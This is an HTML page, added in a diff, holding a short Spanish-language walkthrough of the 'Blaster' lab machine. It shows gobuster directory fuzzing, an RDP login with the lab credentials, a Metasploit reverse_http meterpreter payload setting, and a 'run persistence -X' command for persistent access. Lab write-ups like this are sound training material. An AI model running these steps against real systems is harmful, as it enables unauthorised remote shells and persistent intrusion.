@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blaster Report</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            line-height: 1.6;
+            margin: 20px;
+        }
+
+        h1 {
+            color: #0047ab;
+        }
+
+        h2 {
+            color: #0081ab;
+        }
+
+        code {
+            background-color: #f4f4f4;
+            padding: 2px 6px;
+            border-radius: 3px;
+        }
+
+        img {
+            max-width: 100%;
+            height: auto;
+            margin-bottom: 10px;
+        }
+
+        pre {
+            background-color: #f4f4f4;
+            padding: 10px;
+            border-radius: 5px;
+            overflow-x: auto;
+        }
+
+    </style>
+</head>
+<body>
+    <div style="margin-left: 20%; margin-right: 20%;">
+        <h1># Blaster</h1>
+
+        <h2>Nmap</h2>
+        <img src="image.png" alt="alt text">
+        <img src="image-1.png" alt="alt text">
+
+        <h2>Fuzzing</h2>
+        <pre><code>gobuster dir -u http://10.10.131.79/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-small.txt -x php</code></pre>
+        <img src="image-4.png" alt="alt text">
+        <img src="image-2.png" alt="alt text">
+        <img src="image-3.png" alt="alt text">
+
+        <h2>MSRDP</h2>
+        <p>Nos conectamos al Escritorio remoto</p>
+        <pre><code>xfreerdp /u:wade /p:parzival /v:10.10.131.79</code></pre>
+        <img src="image-5.png" alt="alt text">
+        <p>En el historial podemos ver el CVE</p>
+        <p>En este video veremos el CVE en funcionamiento: <a href="https://www.youtube.com/watch?v=3BQKpPNlTSo">https://www.youtube.com/watch?v=3BQKpPNlTSo</a></p>
+        <img src="image-6.png" alt="alt text">
+        <img src="image-7.png" alt="alt text">
+        <img src="image-8.png" alt="alt text">
+
+        <h2>Metasploit</h2>
+        <img src="image-9.png" alt="alt text">
+        <img src="image-10.png" alt="alt text">
+        <p>Colocamos el LHOST</p>
+        <p>Colocamos el payload</p>
+        <pre><code>set payload windows/meterpreter/reverse_http</code></pre>
+        <p>Ejecutamos la sesion como job</p>
+        <img src="image-11.png" alt="alt text">
+        <p>Copiamos el código en la consola de la máquina con acceso remoto, ya tendremos una shell meterpreter activa</p>
+        <p>Ejecutando el siguiente comando, conseguiremos persistencia en la máquina cuando el sistema se ejecuta</p>
+        <pre><code>run persistence -X</code></pre>
+    </div>
+</body>
+</html>
